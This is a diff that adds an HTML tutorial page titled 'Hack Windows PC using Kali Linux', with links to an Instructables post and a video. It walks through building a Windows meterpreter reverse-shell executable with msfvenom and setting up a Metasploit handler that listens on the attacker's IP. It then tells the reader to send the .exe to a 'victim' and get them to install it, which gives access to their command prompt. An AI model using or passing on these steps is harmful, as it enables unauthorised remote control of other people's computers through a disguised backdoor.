@@ -1,0 +1,40 @@
+<head>
+    <h1>Hack Windows PC using Kali Linux</h1>
+</head>
+<body>
+<p style="text-indent: 80">Let us see how to hack and get access to a Windows PC using Kali Linux.</p>
+<br>
+<p>1. For hacking windows we need to create the payload.Start Up your Kali Linux and open terminal and type <br><b>msfvenom -p windows/meterpreter/reverse_tcp - platform windows-a x86 -f exe -o /root/Desktop/back.exe</b><br>this command will create a payload in the desktop on your machine. </p>
+<br>
+<img src="hackwindows1.png" alt="Creating Payload" >
+<br>
+<p>2. Open the Metasploit Framework Console. Type <br><b>msfconsole</b><br>This metasploit framework console has many payloads and exploit for every attack we need to specify the exploit and the payload</p>
+<br>
+<img src="hackwindows2.png" alt="Metasploit Framework Console" >
+<br>
+<p>3. Type<br><b>use exploit/multi/handler</b><br>This command specifies the payload to be used for this attack</p>
+<br>
+<img src="hackwindows3.png" alt="use exploit/multi/handler" >
+<br>
+<p>4. Type<br><b>set payload windows/meterpreter/reverse_tcp</b><br>This command specfies the payload that we are using for htis attack</p>
+<br>
+<img src="hackwindows4.png" alt="set payload windows/meterpreter/reverse_tcp" >
+<br>
+<p>5. Type <br><b>set LHOST (ip address of the attacker)</b><br>Thsi command will add our machine ip address for backdooring thus the information from the Windows PC will come to this ip address</p>
+<br>
+<img src="hackwindows5.png" alt="set LHOST (ip address of the attacker)" >
+<br>
+<p>6. After completing all the above steps you need to send the .exe file to the victim and make sure that the victim install the .exe file. After that type<br><b>exploit</b><br>After exploiting you can see all the clients that have installed this software and hence you can access their command prompt. </p>
+<br>
+<img src="hackwindows6.png" alt="Exploit" >
+<br>
+<br>
+<a href="http://www.instructables.com/id/Hack-Windows-PC-Using-Kali-Linux/">Click Here</a> to read my instructables.
+<br>
+<p>For clarification you can watch the video</p>
+<br>
+<iframe src="https://www.youtube.com/embed/VLs_jbUbGbs" frameborder="0" allowfullscreen></iframe>
+<br>
+<p>If you are unable to watch the video</p>
+<a href="https://www.youtube.com/watch?v=VLs_jbUbGbs">Click Here</a>
+</body>
